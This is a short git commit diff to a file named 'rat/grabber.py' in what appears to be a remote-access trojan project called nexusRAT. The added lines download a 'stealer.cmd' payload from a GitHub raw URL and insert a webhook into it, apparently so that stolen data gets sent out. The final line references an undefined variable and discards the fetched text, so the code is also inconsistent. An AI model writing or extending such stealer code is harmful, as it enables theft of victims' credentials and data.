70a64744f0f8d6d59ad229b4712e224093220f25
hai17233 <135570073+hai17233@users.noreply.github.com>
2023-12-20 20:31:42 +0700

    Update grabber.py

--- rat/grabber.py
+++ rat/grabber.py
@@ -1,3 +1,6 @@
 import requests
 import os
 
+stealerurl = "https://raw.githubusercontent.com/hai723/nexusRAT/main/scr/stealer.cmd"
+stealer = requests.get(stealerurl).text
+stealer = inj3c710n_cont.replace("stealerwebhook", hook)
